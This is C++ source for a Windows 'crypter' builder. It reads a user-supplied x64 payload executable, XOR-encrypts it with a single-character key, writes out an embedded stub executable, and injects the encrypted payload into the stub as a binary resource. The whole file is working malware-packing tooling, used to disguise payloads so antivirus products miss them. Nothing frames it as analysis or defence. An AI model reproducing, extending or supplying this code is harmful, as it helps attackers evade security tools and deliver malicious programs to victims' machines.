#include <iostream>
#include <windows.h>
#include <fstream>
#include "stub_bytes.h"  // Contains: extern unsigned char Stub_exe[]; extern unsigned int Stub_exe_len;

using namespace std;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        cout << "Usage: crypter.exe <payload.exe>" << endl;
        system("pause");
        return 1;
    }

    const char* resFile = argv[1];

    // === Read payload file ===
    FILE* fileptr = fopen(resFile, "rb");
    if (!fileptr) {
        cerr << "[-] Failed to open input file: " << resFile << endl;
        system("pause");
        return 1;
    }

    fseek(fileptr, 0, SEEK_END);
    long filelen = ftell(fileptr);
    rewind(fileptr);

    char* fileBuff = (char*)malloc(filelen);
    if (!fileBuff) {
        cerr << "[-] Memory allocation failed for payload." << endl;
        fclose(fileptr);
        return 1;
    }

    if (fread(fileBuff, 1, filelen, fileptr) != filelen) {
        cerr << "[-] Failed to read payload file." << endl;
        fclose(fileptr);
        free(fileBuff);
        return 1;
    }
    fclose(fileptr);

    // === Validate PE architecture ===
    IMAGE_DOS_HEADER* _dosHeader = (PIMAGE_DOS_HEADER)fileBuff;
    IMAGE_NT_HEADERS64* _ntHeader = (PIMAGE_NT_HEADERS64)((DWORD64)fileBuff + _dosHeader->e_lfanew);

    bool is64 = _ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
    if (_ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
        cout << "[+] Payload is x64." << endl;
    else if (_ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
        cout << "[+] Payload is x86 (unsupported)." << endl;
    else
        cout << "[-] Unknown architecture!" << endl;

    if (!is64) {
        cout << "[-] Error: Payload is not a valid x64 PE file." << endl;
        free(fileBuff);
        system("pause");
        return 1;
    }

    // === Encrypt payload ===
    char key = 'k';
    char* encrypted = (char*)malloc(filelen);
    if (!encrypted) {
        cerr << "[-] Memory allocation failed for encryption buffer." << endl;
        free(fileBuff);
        return 1;
    }

    for (int i = 0; i < filelen; i++)
        encrypted[i] = fileBuff[i] ^ key;

    // === Write stub from bytes to file ===
    fstream bin("Stub.exe", ios::out | ios::binary);
    if (!bin.write(reinterpret_cast<const char*>(Stub_exe), Stub_exe_len)) {
        cerr << "[-] Could not write stub to Stub.exe" << endl;
        free(fileBuff);
        free(encrypted);
        bin.close();
        system("pause");
        return 1;
    }
    bin.close();

    // === Inject encrypted payload into stub as resource ===
    HANDLE hUpdateRes = BeginUpdateResourceA("Stub.exe", FALSE);
    if (hUpdateRes == NULL) {
        cerr << "[-] Failed to open Stub.exe for resource update." << endl;
        free(fileBuff);
        free(encrypted);
        system("pause");
        return 1;
    }

    BOOL result = UpdateResourceA(
        hUpdateRes,
        "BIN",                       // resource type
        MAKEINTRESOURCEA(132),      // resource ID
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        encrypted,
        filelen
    );

    if (!result) {
        cerr << "[-] Failed to add encrypted payload to resource." << endl;
        EndUpdateResource(hUpdateRes, TRUE);
        free(fileBuff);
        free(encrypted);
        system("pause");
        return 1;
    }

    if (!EndUpdateResource(hUpdateRes, FALSE)) {
        cerr << "[-] Failed to finalize resource update." << endl;
        free(fileBuff);
        free(encrypted);
        system("pause");
        return 1;
    }

    // === Cleanup ===
    free(fileBuff);
    free(encrypted);

    cout << "[+] Stub.exe successfully created with encrypted payload embeddedd." << endl;
    return 0;
}
